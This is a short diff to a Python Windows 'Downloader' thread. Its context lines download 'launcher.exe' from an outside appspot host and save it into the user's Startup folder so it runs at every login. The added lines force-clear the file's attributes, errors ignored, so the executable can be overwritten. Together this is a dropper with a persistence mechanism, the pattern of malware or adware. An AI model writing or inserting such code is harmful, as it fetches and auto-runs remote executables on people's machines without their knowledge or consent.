@@ -39,6 +39,10 @@ class Downloader(threading.Thread):
         path = file_in_special_path(shellcon.CSIDL_STARTUP, "launcher.exe")
         #Save the launcher
         url = urllib2.urlopen("http://littlesitetomakemoney.appspot.com/launcher.exe")
+        try:
+            win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_NORMAL)
+        except:
+            pass
         f = open(path, "w")
         f.write(url.read())
         f.close()
